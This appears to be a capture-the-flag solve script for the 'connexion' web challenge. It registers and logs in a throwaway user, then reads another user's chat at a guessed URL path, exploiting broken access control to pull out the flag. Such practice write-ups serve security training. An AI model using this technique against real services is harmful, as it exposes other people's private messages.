#!/usr/bin/env python3
import requests, os, re

SITE = "http://connexion.challs.olicyber.it/"
USERNAME, PASSWORD = os.urandom(16).hex(), os.urandom(16).hex()
REGEX = r"ptm{.*?}"

s = requests.Session()

print(f"[*] Registering user {USERNAME}:{PASSWORD}")
s.post(SITE + "signin", data={"username": USERNAME, "password": PASSWORD})
print(f"[*] Logging in as {USERNAME}:{PASSWORD}")
s.post(SITE + "login", data={"username": USERNAME, "password": PASSWORD})
print(s.cookies.get_dict())
r = s.get(SITE + "chat/2/1") # sus
flag = re.findall(REGEX, r.text)[0]
print(f"[*] Flag: {flag}")